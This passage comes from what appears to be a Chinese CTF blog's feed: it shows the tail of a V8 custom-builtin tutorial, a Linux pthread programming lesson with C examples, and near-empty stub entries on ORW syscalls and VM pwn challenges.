c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意需要再这个方法里面添加</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(DirectHandle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                               DirectHandle&lt;JSFunction&gt; empty_function)</span> </span>&#123;</span><br><span class="line">&#123;  <span class="comment">// -- M y F u n c</span></span><br><span class="line">  <span class="built_in">SimpleInstallFunction</span>(isolate_, global_object, <span class="string">&quot;MyFunc&quot;</span>, Builtin::kMyFunc, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217223223065.png" alt="image-20250217223223065"></p><h3 id="设置函数优化"><a class="markdownIt-Anchor" href="#设置函数优化"></a> 设置函数优化</h3><ul><li>最后在这个文件中添加<code>turbofan-typer.cc</code>如下代码，需要再<code>switch</code>内部中加入：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (function.<span class="built_in">shared</span>(t-&gt;<span class="built_in">broker</span>()).<span class="built_in">builtin_id</span>()) &#123;</span><br><span class="line"><span class="keyword">case</span> Builtin::kMyFunc:</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">Number</span>();</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217223541411.png" alt="image-20250217223541411"></p><ul><li>这些都添加完之后就可以编译源码了，编译后就可以使用自定义的内置函数<code>MyFunc()</code></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217231653794.png" alt="image-20250217231653794"></p><h1 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h1>]]></content>
    
    
    <summary type="html">前言：牢QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux系统编程1</title>
    <link href="http://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/"/>
    <id>http://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/</id>
    <published>2025-02-23T17:03:25.000Z</published>
    <updated>2025-02-24T12:58:33.869Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>Linux</code>系统编程</li></ul><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><ul><li>使用<code>man</code>命令，可以查看<code>Linux</code>手册，<code>man</code>是<code>manual</code>的命令缩写，其中文意思就是<code>手册</code>的意思。</li><li>我们要查看一个<code>命令</code>或<code>函数</code>的使用方法，我们就可以使用<code>man 命令</code>或<code>man 函数</code></li><li>例如：我们要查看<code>getpid</code>的用法，就可以执行<code>man getpid</code>，就可以查看手册中<code>getpid</code>这个函数的用法</li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224012228588.png" alt="image-20250224012228588"></p><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224012456624.png" alt="image-20250224012456624"></p><ul><li><p>在<code>OS</code>中进程是一个非常重要的概念，之后能让我们更方便理解进程，我们就先介绍另一个命令<code>pstree</code>，这个命令我们用来查看操作系统的进程树。我们可以使用<code>进程树</code>来辅助理解或者调试一些程序。<code>pstree</code>这个命令有一些相关的参数，接下来介绍一些常用的参数。</p><ul><li><code>-p</code>：输出进程树，并且会输出进程号</li><li><code>-a</code>：显示进程树，并且显示每个进程对应的目录文件</li></ul></li><li><p>接下来我们使用<code>pstree -p</code>命令查看一下具体的进程树：</p></li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224013520032.png" alt="image-20250224013520032"></p><h1 id="fork函数"><a class="markdownIt-Anchor" href="#fork函数"></a> fork()函数</h1><ul><li>在理解<code>fork</code>函数之前我们先需要介绍一下进程，在操作系统中我们在运行中的程序就相当于一个<strong>进程</strong>，而每个进程都会有一个进程号（pid），并且进程具有树状关系，一个进程可以创建一个新进程，而这个新进程就相当于是该进程的一个<strong>子进程</strong>。</li><li>在一个进程中，我们可以使用<code>getpid()</code>获取当前进程所对应的进程号，我们还可以使用<code>getppid()</code>获取当前进程所对应父进程的进程号。</li></ul><h1 id="线程相关"><a class="markdownIt-Anchor" href="#线程相关"></a> 线程相关</h1><h2 id="pthread_create函数"><a class="markdownIt-Anchor" href="#pthread_create函数"></a> pthread_create()函数</h2><ul><li><p>会详细介绍<code>pthread_create</code>函数还会详细介绍<code>pthread_join()</code>函数</p></li><li><p><code>pthread_create()</code>，这个函数是Linux系统提供的一个函数，作用是在当前进程中创建一个线程。接下来说明一下这个函数是如何使用的。</p><ul><li>首先要使用这个函数，首先要包含头文件<code>#include&lt;pthread.h&gt;</code>。</li><li>使用<code>gcc</code>编译链接的时候还需要使用<code>-pthread</code>命令来进行编译。</li><li>这个函数的功能：在我们调用<code>pthread_create()</code>函数的进程中，就会在该进程中调用一个线程。这个线程会开始执行下面<code>pthread_create()</code>函数中第<code>3</code>个参数（即函数指针）指向的函数。</li><li>注意：<strong>被指向的函数也有要求，这个函数参数要求传递<code>void *</code>，返回值也要求是<code>void *</code>，但是这并不意味着这个函数没有传递参数，具体请看下面例子</strong>，即指向<code>void</code>类型的指针。这个指针所指向的函数就是我们线程要执行的内容。</li></ul></li><li><p>现在说明一下这个函数的<code>参数</code>和<code>返回值</code>：</p><ul><li><code>pthread_t类型</code>：实际上该类型就是一个<code>无符号整型</code>，只是使用了这个语句进行定义<code>typedef unsigned long int pthread_t;</code></li><li><code>pthread_t *thread</code>：传入的是一个指向<code>线程ID</code>的指针。这也就是说，我们可以自定义<code>线程ID</code>，并不像创建一个子进程，这个进程号是系统给的。</li><li><code>pthread_attr_t *attr</code>：<code>pthread_attr_t</code>是一个结构体，所以<code>*attr</code>是结构体类型的指针，其指向的是<code>pthread_attr_t</code>。这个结构体指针，这个参数就是用来决定新线程的属性。如果该线程没有属性，就使用<code>NULL</code>作为参数。</li><li><code>void *(*start_routine)(void *)</code>：<code>start_routine</code>是一个函数指针，这个指针指向的函数地址就是线程要执行的内容。</li><li><code>void *arg</code>：传递给线程函数的参数，没有任何参数就填<code>NULL</code></li><li>返回值：创建成功就会返回<code>0</code>，创建失败就会返回一个特定的<code>非零值</code>。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span></span><br><span class="line">    <span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr, <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure><h3 id="level_1"><a class="markdownIt-Anchor" href="#level_1"></a> level_1</h3><ul><li>接下来举一个例子：<ul><li>就是创建一个线程，使得线程执行<code>thread_function</code></li><li>但是这个代码的执行结果不符合我们的预期，原因是进程创建完线程就结束了，进程结束会导致线程也被终止，线程是依赖于进程的，其资源属于进程</li><li>所以这时我们需要在创建完线程后，让进程执行<code>while</code>循环，以确保进程不结束，这样就得到了预期结果</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224190908851.png" alt="image-20250224190908851"></p><h3 id="level_2"><a class="markdownIt-Anchor" href="#level_2"></a> level_2</h3><ul><li>但是这个代码还是有问题，因为线程进入死循环了，现在我们继续修改这个代码，使得线程有限次循环。</li><li>但是还会出现问题，这个线程结束后进程还会在等待中，这样程序一直不会结束</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level_3"><a class="markdownIt-Anchor" href="#level_3"></a> level_3</h3><ul><li>接下来我们继续改进该程序，使得进程能够接受到线程结束。这个时候需要使用到<code>pthread_join()</code>这个函数。<ul><li>这个函数就是等待我们创建的线程结束。线程结束，这个函数将立刻返回；线程没结束，这个函数将阻塞进程。</li><li>这个函数有两个参数和<code>int</code>类型的返回值<code>int pthread_join(pthread_t thread, void **retval);</code><ul><li><code>pthread_t thread</code>：<code>线程ID</code>，<code>pthread_join</code>要等待什么线程结束</li><li><code>void **retval</code>：<code>结束状态</code>，如果这个指针不是空指针，将保存目标线程的退出状态，如果不想保存就使用<code>NULL</code></li><li><code>返回值</code>：调用成功返回<code>0</code></li></ul></li></ul></li><li>接下来继续优化代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// gcc 6_thread,c -pthread</span><br><span class="line"><span class="comment">#include&lt;pthread.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void *thread_function(void *arg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">        pthread_t pthread;</span><br><span class="line">        <span class="built_in">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, NULL, thread_function, NULL);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_join(pthread,NULL);</span><br><span class="line">        printf(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void *thread_function(void *arg)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">int</span> i;</span><br><span class="line">        printf(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224192455330.png" alt="image-20250224192455330"></p><h3 id="level4"><a class="markdownIt-Anchor" href="#level4"></a> level4</h3><ul><li><p>接下来我们继续改进该程序，让我们的进程指定线程循环的次数。这时就需要用上<code>pthread_create()</code>函数的最后一个参数<code>* argv</code></p></li><li><p>但是如果我们按照正常指针来使用这个参数，在编译的时候就会发生错误，因为传递的是<code>void</code>类型的指针，这时需要转换为<code>整型</code>类型的指针</p></li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193032681.png" alt="image-20250224193032681"></p><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193053738.png" alt="image-20250224193053738"></p><ul><li>最终代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, &amp;count);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_join(pthread,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; *(<span class="type">int</span> *)arg; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193322794.png" alt="image-20250224193322794"></p><h2 id="多线程"><a class="markdownIt-Anchor" href="#多线程"></a> 多线程</h2><h2 id="线程之间通信"><a class="markdownIt-Anchor" href="#线程之间通信"></a> 线程之间通信</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Linux&lt;/code&gt;系统编程&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础知识&quot;&gt;&lt;/a&gt; 基础知识&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;man&lt;/code</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ORW相关系统调用</title>
    <link href="http://iyheart.github.io/2025/02/23/ORW%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>http://iyheart.github.io/2025/02/23/ORW%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</id>
    <published>2025-02-23T15:19:56.000Z</published>
    <updated>2025-02-23T15:22:03.311Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本篇博客会详细介绍一些<code>ORW</code>系统调用，包括如何使用，相关参数，以及底层原理。</li></ul><h1 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h1><h2 id="open"><a class="markdownIt-Anchor" href="#open"></a> open</h2><h2 id="read"><a class="markdownIt-Anchor" href="#read"></a> read</h2><h2 id="write"><a class="markdownIt-Anchor" href="#write"></a> write</h2><h1 id="代替open"><a class="markdownIt-Anchor" href="#代替open"></a> 代替open</h1><h1 id="代替write"><a class="markdownIt-Anchor" href="#代替write"></a> 代替write</h1><h1 id="代替read"><a class="markdownIt-Anchor" href="#代替read"></a> 代替read</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;本篇博客会详细介绍一些&lt;code&gt;ORW&lt;/code&gt;系统调用，包括如何使用，相关参数，以及底层原理。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基础&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础&quot;&gt;&lt;/a&gt; 基础&lt;/h1&gt;
&lt;h2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vm_pwn入门</title>
    <link href="http://iyheart.github.io/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/"/>
    <id>http://iyheart.github.io/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/</id>
    <published>2025-02-22T15:05:07.000Z</published>
    <updated>2025-02-22T15:11:46.636Z</updated>
    
    <content type="html"><![CDATA[<ul><li>打算新生赛出一题<code>vm pwn</code>，不知道来不来得及出。趁着出题给自己也入门一下<code>vm pwn</code></li><li>接下来介绍一下<code>vm pwn</code>，这里需要纠正一个误区，<code>vm pwn</code>并不单单指的是<code>虚拟机类型的pwn</code>，<code>虚拟机的pwn</code>可能还距离我有点远。</li></ul><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li><code>vm_pwn</code>出题方向一般就是往以下几个方面出题：<ul><li><strong>模拟汇编指令</strong>：题目会给你一个内存栈，并且给一些操作，用于模拟<strong>汇编语言、read、write</strong>等的操作</li><li></li></ul></li></ul>]]></content>
    
    
    <summary type="html">浅浅入门一下vm_pwn</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN刷题</title>
    <link href="http://iyheart.github.io/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/"/>
    <id>http://iyheart.github.io/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/</id>
    <published>2025-02-17T16:01:34.000Z</published>
    <updated>2025-02-23T04:44:54.083Z</updated>
    
